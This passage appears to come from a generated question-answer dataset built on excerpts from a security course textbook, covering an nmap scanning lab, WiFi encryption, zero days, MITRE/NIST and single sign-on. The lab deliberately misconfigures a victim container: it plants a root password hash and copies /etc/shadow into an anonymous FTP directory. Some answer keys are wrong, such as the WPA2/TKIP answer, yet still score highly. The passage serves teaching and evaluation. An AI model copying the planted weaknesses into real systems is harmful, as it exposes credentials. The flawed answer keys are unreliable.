another named\n\n`scanner`{.literal} which we will use to learn about nmap. Lets start a BASH shell on `scanner`{.literal} and work from\n\nthere:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>PS C:\\Users\\rxt1077\\temp\\nmap&gt; docker-compose run scanner bash\n\nCreating nmap_scanner_run ... done\n\nroot@7b6d733cc03a:/\u2460</code></pre>\n\n</figure>\n\n::: callout-list\n\n1.  *\u2460* Notice the prompt change. We are now *inside* the `scanner`{.literal} container running BASH.\n\n:::\n\nLets use the Linux `ip addr`{.literal} command to see what our IP address on this network is:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# ip addr\n\n1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n\n    inet 127.0.0.1/8 scope host lo\n\n       valid_lft forever preferred_lft forever\n\n2: tunl0@NONE: &lt;NOARP&gt; mtu 1480 qdisc noop state DOWN group default qlen 1000\n\n    link/ipip 0.0.0.0 brd 0.0.0.0\n\n3: sit0@NONE: &lt;NOARP&gt; mtu 1480 qdisc noop state DOWN group default qlen 1000\n\n    link/sit 0.0.0.0 brd 0.0.0.0\n\n165: eth0@if166: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default\n\n    link/ether 02:42:ac:14:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0\n\n    inet 172.20.0.2/16 brd 172.20.255.255 scope global eth0\n\n       valid_lft forever preferred_lft forever</code></pre>\n\n</figure>\n\nWe care about the `eth0`{.literal} device, so as you can see on my machine the address is `172.20.0.2`{.literal}. We\n\nwill use nmap's ping scan to search for any device within the last 8 bits of our IP address (`/24`{.literal}). You may\n\nnotice that we are actually on a `/16`{.literal} subnet, but by limiting ourselves to `/24`{.literal} the scan will go\n\n*much* faster.\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# nmap -sP 172.20.0.0/24\n\nStarting Nmap 7.70 ( https://nmap.org ) at 2021-09-22 20:25 UTC\n\nNmap scan report for 172.20.0.1\n\nHost is up (0.000076s latency).\n\nMAC Address: 02:42:A6:CA:0D:77 (Unknown)\n\nNmap scan report for nmap_victim_1.nmap_default (172.20.0.3)\n\nHost is up (0.000070s latency).\n\nMAC Address: 02:42:AC:14:00:03 (Unknown)\n\nNmap scan report for 7b6d733cc03a (172.20.0.2)\n\nHost is up.\n\nNmap done: 256 IP addresses (3 hosts up) scanned in 5.78 seconds</code></pre>\n\n</figure>\n\nIn this instance we found three other machines on the network. One of which is conveniently named victim.\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\n[Read the nmap documentation for host discovery.](https://nmap.org/book/man-host-discovery.html){.link} What other types\n\nof scans could you use if a host does not respond to an ICMP ping packet?\n\n:::\n\n</aside>\n\nNow lets do a full scan on on the victim machine. Docker Compose does a nice job of resolving DNS requests for sensible\n\nnames in the `docker-compose.yml`{.literal} file so we can refer to the host we want to scan as `victim`{.literal}.\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# nmap victim\n\nStarting Nmap 7.70 ( https://nmap.org ) at 2021-09-22 20:37 UTC\n\nNmap scan report for victim (172.20.0.3)\n\nHost is up (0.000018s latency).\n\nrDNS record for 172.20.0.3: nmap_victim_1.nmap_default\n\nNot shown: 999 closed ports\n\nPORT   STATE SERVICE\n\n21/tcp open  ftp\n\nMAC Address: 02:42:AC:14:00:03 (Unknown)\n\nNmap done: 1 IP address (1 host up) scanned in 1.84 seconds</code></pre>\n\n</figure>\n\nBy default, nmap uses a [SYN](https://www.techtarget.com/searchnetworking/definition/SYN-scanning){.link} scan against\n\nwell known ports. This type of scan is harder to detect (as it does not fully open a connection) and can be run quickly.\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nWhat ports are open on the victim machine? Why is *this* particular protocol insecure?\n\n:::\n\n</aside>\n\nnmap is capable of much more than just simple port scanning. nmap includes version detection and OS fingerprinting\n\n(among other things). To get a much better picture of what exactly `victim`{.literal} is running, you can use the\n\n`-A`{.literal} option:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# nmap -A victim\n\nStarting Nmap 7.70 ( https://nmap.org ) at 2021-09-22 20:44 UTC\n\nNmap scan report for victim (172.20.0.3)\n\nHost is up (0.000096s latency).\n\nrDNS record for 172.20.0.3: nmap_victim_1.nmap_default\n\nNot shown: 999 closed ports\n\nPORT   STATE SERVICE VERSION\n\n21/tcp open  ftp     ProFTPD\n\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n\n|_drwxr-xr-x   1 ftp      users        4096 Sep 22 20:11 incoming\n\nMAC Address: 02:42:AC:14:00:03 (Unknown)\n\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\n\nTCP/IP fingerprint:\n\nOS:SCAN(V=7.70%E=4%D=9/22%OT=21%CT=1%CU=44136%PV=Y%DS=1%DC=D%G=Y%M=0242AC%T\n\nOS:M=614B95AE%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=109%TI=Z%CI=Z%TS=A\n\nOS:)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B\n\nOS:4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88\n\nOS:)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+\n\nOS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)\n\nOS:T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A\n\nOS:=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%D\n\nOS:F=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=4\n\nOS:0%CD=S)\n\nNetwork Distance: 1 hop\n\nTRACEROUTE\n\nHOP RTT     ADDRESS\n\n1   0.10 ms nmap_victim_1.nmap_default (172.20.0.3)\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n\nNmap done: 1 IP address (1 host up) scanned in 28.39 seconds</code></pre>\n\n</figure>\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nWhat additional information did you learn from the `-A`{.literal} option? How do you think this could be exploited?\n\n:::\n\n</aside>\n\nNow, using the `scanner`{.literal} container you are currently on see what you can find out about `victim`{.literal}.\n\n[This man page may be of some help.](https://linux.die.net/man/1/ftp){.link}\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nBONUS: Remembering what you learned in the *Hash it Out* lab, what is the root password on the victim machine?\n\n:::\n\n</aside>\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nBONUS: How can you test to see if you got it right? What does this say about how ProFTP is configured on\n\n`victim`{.literal}?\n\n:::\n\n</aside>\n\nWhen you are all done poking around, you can exit the shell and run `docker-compose down`{.literal} to stop\n\n`victim`{.literal} from running in the background.\n\n:::::::::\n\n:::: {.section .sect2 title=\"4.6. Review Questions\"}\n", "topic": "Recognizing the potential risks associated with running vulnerable services on a network.", "question": "Based on the provided context, what specific vulnerabilities were identified on the `victim` machine, and how could these be exploited to compromise the system?", "answer": "The `victim` machine has a default root password, a shadow backup, and is running ProFTPD with anonymous FTP login enabled.", "explanation": "The context reveals that the `victim` machine runs ProFTPD with a default root password, and has an \u2018incoming\u2019 directory with a shadow backup. These configurations represent significant security risks, potentially allowing unauthorized access and data breaches. Exploitation could involve gaining root access, uploading malicious files, or exfiltrating sensitive information.", "question_token_count": 31, "answer_correctness_score": 10, "explanation_validity_score": 10, "question_clarity_score": 8, "question_groundedness_score": 10, "avg_answer_token_count": 29, "choices": null}
{"context": "### 4.1.2. Wifi {#_computer_systems_security_planning_for_success.xhtml__wifi}\nThe Wifi protocols we are most concerned with are the security standards used to encrypt data. By the nature of a\n\nwireless protocol, information sent on the network is available to anyone with an antenna. These Wifi security standards\n\nare the only thing protecting your network traffic from being viewing by anyone within your transmitting range. There\n\nare currently four standards:\n\n::: description-list\n\n[WEP]{.term}\n\n:   [Wireless Equivalent Privacy (WEP) is depreceated and should not be used. It was developed in 1999 and uses an RC4\n\n    stream and 24-bit encryption. Several attacks have been developed that can crack WEP within a matter of\n\n    seconds.]{.principal}\n\n[WPA]{.term}\n\n:   [Wifi Protected Access (WPA) utilized Temporal Key Integrity Protocol (TKIP) to change the keys being used. This\n\n    128-bit encryption method has also been cracked and the protocol should not be used.]{.principal}\n\n[WPA2]{.term}\n\n:   [Wifi Protected Access 2 (WPA2) makes use of AES encryption and is currently the most popular standard. WPA2 is\n\n    still considered secure.]{.principal}\n\n[WPA3]{.term}\n\n:   [Wifi Protected Access 3 (WPA3) was developed in 2018 and is currently considered state-of-the-art. Many networks\n\n    are beginning the transition from WPA2 to WPA3.]{.principal}\n\n:::\n\n::::\n\n::::::\n\n:::::::::: {.section .sect2 title=\"4.2. Internet Layer Protocols\"}\n", "topic": "Describe the historical progression of Wifi security standards, from WEP to WPA3, and the primary motivations behind each iteration.", "question": "What were the primary reasons for the deprecation of WEP and the subsequent development of WPA, WPA2, and WPA3 in Wifi security protocols?", "answer": "WEP was deprecated due to vulnerabilities, WPA due to cracking, WPA2 due to reliance on TKIP, and WPA3 for state-of-the-art security.", "explanation": "WEP was abandoned due to demonstrated vulnerabilities, while subsequent iterations (WPA, WPA2, and WPA3) were developed to address identified weaknesses and enhance security.", "question_token_count": 31, "answer_correctness_score": 9, "explanation_validity_score": 9, "question_clarity_score": 9, "question_groundedness_score": 10, "avg_answer_token_count": 33, "choices": null}
{"context": "## Zero Days\n::: content\n\nModern operating systems employ layers of security to ensure that programs do not have access to sensitive information\n\nor applications. This typically means that for malware to be effective, it needs to elevate its privileges. The most\n\neffective malware can perform privilege escalation without requiring user interaction. To do this malware may rely on\n\nnew/undocumented exploits or vulnerabilities. These new exploits that have been disclosed for \\\"zero days\\\" are hence\n\nare referred to as *zero days*. Zero days are incredibly powerful and may be hoarded by APTs/criminal groups or sold for\n\nmillions of dollars on the Dark Web.\n\n:::\n\n</aside>\n\n:::::\n\n:::::::::::::::::::::::: {.section .sect2 title=\"3.3. Types of Malware\"}\n\n\n## 3.3. Types of Malware {#_computer_systems_security_planning_for_success.xhtml__types_of_malware}\nThe definition of malware is so broad and new malware is being created daily. This can make it difficult to classify\n\nmalware. As we go through some basic types, please keep in mind that there is significant overlap. For example, you may\n\nencounter ransomware distributed as a virus *or* ransomware distributed as a trojan. The fact that it is ransomware does\n\nnot preclude it from being some other type of malware as well.\n\n:::::::::::: {.section .sect3 title=\"3.3.1. Worms, Viruses, and Trojans\"}\n", "topic": "How do malware actors typically leverage zero-day vulnerabilities to achieve privilege escalation?", "question": "What is the primary method by which malware actors exploit zero-day vulnerabilities for privilege escalation, according to the provided text?", "answer": "New/undocumented exploits or vulnerabilities", "explanation": "The text explicitly states that malware leverages new/undocumented exploits or vulnerabilities to achieve this.", "question_token_count": 24, "answer_correctness_score": 10, "explanation_validity_score": 10, "question_clarity_score": 7, "question_groundedness_score": 10, "avg_answer_token_count": 8, "choices": null}
{"context": "### 9.1.1. MITRE {#_computer_systems_security_planning_for_success.xhtml__mitre}\n<figure class=\"image left\">\n\n<div class=\"content\">\n\n<img src=\"images/mitre.svg\" width=\"200\" alt=\"mitre\" />\n\n</div>\n\n<figcaption><a href=\"https://commons.wikimedia.org/wiki/File:Mitre_Corporation_logo.svg\" class=\"link\">The MITRE\n\nCorporation, Public domain, via Wikimedia Commons</a></figcaption>\n\n</figure>\n\nIn the 1940s and 1950s MIT scientists developed large-scale computing laboratories. In 1958 MITRE was formed as a\n\nprivate corporation from the personnel and equipment in these labs. Currently, MITRE is a federally funded research and\n\ndevelopment center.\n\nAs mentioned previously, MITRE maintains the CVE DB. MITRE has also developed the ATT&CK framework for analyzing\n\nincidents. We will go through each step of the framework at the end of this chapter.\n\n:::\n\n:::: {.section .sect3 title=\"9.1.2. NIST\"}\n\n\n### 9.1.2. NIST {#_computer_systems_security_planning_for_success.xhtml__nist}\nNIST stands for National Institute of Standards and Technology. It is a federally supported through the US Department of\n\nCommerce and posits itself as an institute to promote American innovation. NIST develops standards, guidelines, and best\n\npractices in technical fields.\n\nNIST also has a security framework they've developed known as the NIST framework. It outlines the general\n\nresponsibilities of a security team:\n\n::: itemized-list\n\n- [Identify]{.principal}\n\n- [Protect]{.principal}\n\n- [Detect]{.principal}\n\n- [Respond]{.principal}\n\n- [Recover]{.principal}\n\n:::\n\n::::\n\n::: {.section .sect3 title=\"9.1.3. OWASP\"}\n", "topic": "The significance of the ATT&CK framework developed by MITRE as a tool for incident analysis.", "question": "Considering the ATT&CK framework\u2019s design, how does its structured approach to adversary tactics and techniques contribute to a more effective incident response compared to traditional, less formalized methods?", "answer": "A structured approach to adversary tactics and techniques.", "explanation": "The answer is derived from the context's description of the ATT&CK framework as a tool for analyzing incidents. The framework's structured approach, encompassing tactics and techniques, provides a systematic way to understand and respond to attacks.", "question_token_count": 36, "answer_correctness_score": 7, "explanation_validity_score": 6, "question_clarity_score": 7, "question_groundedness_score": 4, "avg_answer_token_count": 10, "choices": null}
{"context": "## 4.5. Lab: Scanning with nmap {#_computer_systems_security_planning_for_success.xhtml__lab_scanning_with_nmap}\nFor this lab we will start by downloading and extracting the files required. Download\n\n[nmap.zip](https://github.com/rxt1077/it230/raw/main/labs/nmap.zip){.link} and extract it to a directory you can access\n\nfrom the shell. Open a shell in that directory (it should have a `docker-compose.yml`{.literal} in it and a\n\n`victim`{.literal} and `scanner`{.literal} directory). Since we will be simulating multiple machines in this lab, we\n\nwill make use of Docker Compose which was already installed with Docker. Docker Compose reads a\n\n`docker-compose.yml`{.literal} file which should already be in your `nmap`{.literal} directory. Run\n\n`docker-compose up --build --detach`{.literal} to build and run the images in the background:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>PS C:\\Users\\rxt1077\\temp\\nmap&gt; docker-compose up --build --detach\n\nBuilding victim\n\n[+] Building 2.9s (15/15) FINISHED\n\n =&gt; [internal] load build definition from Dockerfile                                                                                                   0.1s\n\n =&gt; =&gt; transferring dockerfile: 518B                                                                                                                   0.0s\n\n =&gt; [internal] load .dockerignore                                                                                                                      0.1s\n\n =&gt; =&gt; transferring context: 2B                                                                                                                        0.0s\n\n =&gt; [internal] load metadata for docker.io/library/debian:latest                                                                                       0.0s\n\n =&gt; [ 1/10] FROM docker.io/library/debian                                                                                                              0.0s\n\n =&gt; [internal] load build context                                                                                                                      0.0s\n\n =&gt; =&gt; transferring context: 640B                                                                                                                      0.0s\n\n =&gt; CACHED [ 2/10] RUN apt-get -y update                                                                                                               0.0s\n\n =&gt; CACHED [ 3/10] RUN apt-get -y install proftpd-basic                                                                                                0.0s\n\n =&gt; CACHED [ 4/10] RUN sed -i &quot;1s/.*/root:$6$.DEC7ti\\/4959zEK9$H7BPwBTz6tISYG8oZuhXLS5L3ZPYwdzzQNQTg8m4Ql3ebX9U\\/afVhi4OSpK3mNTSpT8DefJ2USdWuT5DHOkRY  0.0s\n\n =&gt; [ 5/10] RUN sed -i &quot;/^root/d&quot; /etc/ftpusers                                                                                                        0.4s\n\n =&gt; [ 6/10] COPY bad.conf /etc/proftpd/conf.d/                                                                                                         0.0s\n\n =&gt; [ 7/10] RUN chsh -s /bin/bash ftp                                                                                                                  0.6s\n\n =&gt; [ 8/10] RUN mkdir -p /home/ftp/incoming                                                                                                            0.5s\n\n =&gt; [ 9/10] RUN cp /etc/shadow /home/ftp/incoming/shadow.backup                                                                                        0.6s\n\n =&gt; [10/10] RUN chown -R ftp.users /home/ftp                                                                                                           0.5s\n\n =&gt; exporting to image                                                                                                                                 0.2s\n\n =&gt; =&gt; exporting layers                                                                                                                                0.2s\n\n =&gt; =&gt; writing image sha256:dc9af53b250b4f7fcfbe5a6668a540bd02ebef0353c5927ed4591a512363e831                                                           0.0s\n\n =&gt; =&gt; naming to docker.io/library/nmap_victim                                                                                                         0.0s\n\nUse &#39;docker scan&#39; to run Snyk tests against images to find vulnerabilities and learn how to fix them\n\nBuilding scanner\n\n[+] Building 0.1s (7/7) FINISHED\n\n =&gt; [internal] load build definition from Dockerfile                                                                                                   0.0s\n\n =&gt; =&gt; transferring dockerfile: 111B                                                                                                                   0.0s\n\n =&gt; [internal] load .dockerignore                                                                                                                      0.0s\n\n =&gt; =&gt; transferring context: 2B                                                                                                                        0.0s\n\n =&gt; [internal] load metadata for docker.io/library/debian:latest                                                                                       0.0s\n\n =&gt; [1/3] FROM docker.io/library/debian                                                                                                                0.0s\n\n =&gt; CACHED [2/3] RUN apt-get -y update                                                                                                                 0.0s\n\n =&gt; CACHED [3/3] RUN apt-get -y install nmap ftp john                                                                                                  0.0s\n\n =&gt; exporting to image                                                                                                                                 0.0s\n\n =&gt; =&gt; exporting layers                                                                                                                                0.0s\n\n =&gt; =&gt; writing image sha256:14ba503b7925089023184d783c53c22c4167fdf2338df0e85143daedf8b458ac                                                           0.0s\n\n =&gt; =&gt; naming to docker.io/library/nmap_scanner                                                                                                        0.0s\n\nUse &#39;docker scan&#39; to run Snyk tests against images to find vulnerabilities and learn how to fix them\n\nStarting nmap_scanner_1  ... done\n\nRecreating nmap_victim_1 ... done</code></pre>\n\n</figure>\n\nNow we actually have two containers running, one named `victim`{.literal} which is our target machine and another named\n\n`scanner`{.literal} which we will use to learn about nmap. Lets start a BASH shell on `scanner`{.literal} and work from\n\nthere:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>PS C:\\Users\\rxt1077\\temp\\nmap&gt; docker-compose run scanner bash\n\nCreating nmap_scanner_run ... done\n\nroot@7b6d733cc03a:/\u2460</code></pre>\n\n</figure>\n\n::: callout-list\n\n1.  *\u2460* Notice the prompt change. We are now *inside* the `scanner`{.literal} container running BASH.\n\n:::\n\nLets use the Linux `ip addr`{.literal} command to see what our IP address on this network is:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# ip addr\n\n1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n\n    inet 127.0.0.1/8 scope host lo\n\n       valid_lft forever preferred_lft forever\n\n2: tunl0@NONE: &lt;NOARP&gt; mtu 1480 qdisc noop state DOWN group default qlen 1000\n\n    link/ipip 0.0.0.0 brd 0.0.0.0\n\n3: sit0@NONE: &lt;NOARP&gt; mtu 1480 qdisc noop state DOWN group default qlen 1000\n\n    link/sit 0.0.0.0 brd 0.0.0.0\n\n165: eth0@if166: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default\n\n    link/ether 02:42:ac:14:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0\n\n    inet 172.20.0.2/16 brd 172.20.255.255 scope global eth0\n\n       valid_lft forever preferred_lft forever</code></pre>\n\n</figure>\n\nWe care about the `eth0`{.literal} device, so as you can see on my machine the address is `172.20.0.2`{.literal}. We\n\nwill use nmap's ping scan to search for any device within the last 8 bits of our IP address (`/24`{.literal}). You may\n\nnotice that we are actually on a `/16`{.literal} subnet, but by limiting ourselves to `/24`{.literal} the scan will go\n\n*much* faster.\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# nmap -sP 172.20.0.0/24\n\nStarting Nmap 7.70 ( https://nmap.org ) at 2021-09-22 20:25 UTC\n\nNmap scan report for 172.20.0.1\n\nHost is up (0.000076s latency).\n\nMAC Address: 02:42:A6:CA:0D:77 (Unknown)\n\nNmap scan report for nmap_victim_1.nmap_default (172.20.0.3)\n\nHost is up (0.000070s latency).\n\nMAC Address: 02:42:AC:14:00:03 (Unknown)\n\nNmap scan report for 7b6d733cc03a (172.20.0.2)\n\nHost is up.\n\nNmap done: 256 IP addresses (3 hosts up) scanned in 5.78 seconds</code></pre>\n\n</figure>\n\nIn this instance we found three other machines on the network. One of which is conveniently named victim.\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\n[Read the nmap documentation for host discovery.](https://nmap.org/book/man-host-discovery.html){.link} What other types\n\nof scans could you use if a host does not respond to an ICMP ping packet?\n\n:::\n\n</aside>\n\nNow lets do a full scan on on the victim machine. Docker Compose does a nice job of resolving DNS requests for sensible\n\nnames in the `docker-compose.yml`{.literal} file so we can refer to the host we want to scan as `victim`{.literal}.\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# nmap victim\n\nStarting Nmap 7.70 ( https://nmap.org ) at 2021-09-22 20:37 UTC\n\nNmap scan report for victim (172.20.0.3)\n\nHost is up (0.000018s latency).\n\nrDNS record for 172.20.0.3: nmap_victim_1.nmap_default\n\nNot shown: 999 closed ports\n\nPORT   STATE SERVICE\n\n21/tcp open  ftp\n\nMAC Address: 02:42:AC:14:00:03 (Unknown)\n\nNmap done: 1 IP address (1 host up) scanned in 1.84 seconds</code></pre>\n\n</figure>\n\nBy default, nmap uses a [SYN](https://www.techtarget.com/searchnetworking/definition/SYN-scanning){.link} scan against\n\nwell known ports. This type of scan is harder to detect (as it does not fully open a connection) and can be run quickly.\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nWhat ports are open on the victim machine? Why is *this* particular protocol insecure?\n\n:::\n\n</aside>\n\nnmap is capable of much more than just simple port scanning. nmap includes version detection and OS fingerprinting\n\n(among other things). To get a much better picture of what exactly `victim`{.literal} is running, you can use the\n\n`-A`{.literal} option:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# nmap -A victim\n\nStarting Nmap 7.70 ( https://nmap.org ) at 2021-09-22 20:44 UTC\n\nNmap scan report for victim (172.20.0.3)\n\nHost is up (0.000096s latency).\n\nrDNS record for 172.20.0.3: nmap_victim_1.nmap_default\n\nNot shown: 999 closed ports\n\nPORT   STATE SERVICE VERSION\n\n21/tcp open  ftp     ProFTPD\n\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n\n|_drwxr-xr-x   1 ftp      users        4096 Sep 22 20:11 incoming\n\nMAC Address: 02:42:AC:14:00:03 (Unknown)\n\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\n\nTCP/IP fingerprint:\n\nOS:SCAN(V=7.70%E=4%D=9/22%OT=21%CT=1%CU=44136%PV=Y%DS=1%DC=D%G=Y%M=0242AC%T\n\nOS:M=614B95AE%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=109%TI=Z%CI=Z%TS=A\n\nOS:)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B\n\nOS:4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88\n\nOS:)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+\n\nOS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)\n\nOS:T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A\n\nOS:=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%D\n\nOS:F=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=4\n\nOS:0%CD=S)\n\nNetwork Distance: 1 hop\n\nTRACEROUTE\n\nHOP RTT     ADDRESS\n\n1   0.10 ms nmap_victim_1.nmap_default (172.20.0.3)\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n\nNmap done: 1 IP address (1 host up) scanned in 28.39 seconds</code></pre>\n\n</figure>\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nWhat additional information did you learn from the `-A`{.literal} option? How do you think this could be exploited?\n\n:::\n\n</aside>\n\nNow, using the `scanner`{.literal} container you are currently on see what you can find out about `victim`{.literal}.\n\n[This man page may be of some help.](https://linux.die.net/man/1/ftp){.link}\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nBONUS: Remembering what you learned in the *Hash it Out* lab, what is the root password on the victim machine?\n\n:::\n\n</aside>\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nBONUS: How can you test to see if you got it right? What does this say about how ProFTP is configured on\n\n`victim`{.literal}?\n\n:::\n\n</aside>\n\nWhen you are all done poking around, you can exit the shell and run `docker-compose down`{.literal} to stop\n\n`victim`{.literal} from running in the background.\n\n:::::::::\n\n:::: {.section .sect2 title=\"4.6. Review Questions\"}\n", "topic": "Identifying potential security risks related to default configurations and weak passwords.", "question": "Based on the nmap scan results, what potential vulnerabilities are present on the \u2018victim\u2019 machine due to its default ProFTPD configuration, specifically concerning the FTP login process and file permissions?", "answer": "Weak root password, anonymous FTP login allowed, and accessible \u2018incoming\u2019 directory.", "explanation": "The nmap scan revealed that the FTP service was open with anonymous login allowed and a weak root password. The file permissions also allowed access to the \u2018incoming\u2019 directory. These factors combine to create a significant security risk, as an attacker could potentially gain unauthorized access to the system.", "question_token_count": 40, "answer_correctness_score": 10, "explanation_validity_score": 10, "question_clarity_score": 6, "question_groundedness_score": 9, "avg_answer_token_count": 17, "choices": null}
{"context": "### 7.3.9. Single Sign On (SSO) {#_computer_systems_security_planning_for_success.xhtml__single_sign_on_sso}\nGiven the ubiquitous nature of web applications, maintaining separate usernames and passwords can be difficult for\n\nusers. A recent trend has been to support Single Sign On, where one identity provider is used to confirm that users are\n\nwho they claim to be. There are a few protocols that make this possible, including SAML and OAuth.\n\nSAML stands for Security Assertion Markup Language and is an XML based Single Sign On solution. The SAML workflow\n\ncenters around the SAML identity provider or IDP. The following steps take place to grant access to a resource via SAML:\n\n::: {.ordered-list .arabic}\n\n1.  [User accesses a sevice]{.principal}\n\n2.  [User is redirected to SAML IDP with SAML request]{.principal}\n\n3.  [User logs in]{.principal}\n\n4.  [Credentials are verified]{.principal}\n\n5.  [SAML IDP sends credentials to the service]{.principal}\n\n:::\n\nOpenID is another protocol that allows users to authenticated using a third-party identity provider in a similar fashion\n\nto SAML. One of the main differences is that OpenID was designed to be decentralized, allowing for multiple IDPs for\n\nusers to choose from. In February 2014 OpenID introduced OpenID Connect (OIDC), a more modern system that allows IDPs to\n\nprovide information about users via a REST API. This move was largely in response to the popularity of OAuth.\n\nOAuth is a method for allowing websites to access parts of a user's profile with the user's permission. OAuth is not\n\n*technically* a full-fledged authentication protocol, but it is often used as part of one. The following diagram\n\nhighlights the differences between OpenID authentication and an OAuth flow:\n\n<figure class=\"image\">\n\n<div class=\"content\">\n\n<img src=\"images/oauth.svg\" width=\"800\" alt=\"oauth\" />\n\n</div>\n\n<figcaption><a href=\"https://commons.wikimedia.org/wiki/File:OpenIDvs.Pseudo-AuthenticationusingOAuth.svg\"\n\nclass=\"link\">OpenID vs. Pseudo-Authentication using OAuth</a> by <a\n\nhref=\"https://commons.wikimedia.org/wiki/File:OpenIDvs.Pseudo-AuthenticationusingOAuth.svg\" class=\"link\">Perhelion</a>\n\nused under <a href=\"https://commons.wikimedia.org/wiki/File:OpenIDvs.Pseudo-AuthenticationusingOAuth.svg\"\n\nclass=\"link\">CC0 1.0</a></figcaption>\n\n</figure>\n\n::::\n\n::::: {.section .sect3 title=\"7.3.10. Kerberos\"}\n", "topic": "The diagram illustrates the key differences between OpenID authentication and an OAuth flow, highlighting their distinct approaches to user authorization.", "question": "Considering the described SAML workflow and the subsequent introduction of OpenID Connect (OIDC) driven by OAuth\u2019s popularity, what fundamental architectural shift does OIDC represent compared to the decentralized approach of OpenID?", "answer": "A shift to a RESTful API-based system for user information exchange.", "explanation": "OIDC represents a shift from relying on multiple, independent identity providers to a standardized, RESTful API-based system for user information exchange, aligning with the broader trend of API-centric design.", "question_token_count": 41, "answer_correctness_score": 9, "explanation_validity_score": 8, "question_clarity_score": 8, "question_groundedness_score": 10, "avg_answer_token_count": 15, "choices": null}
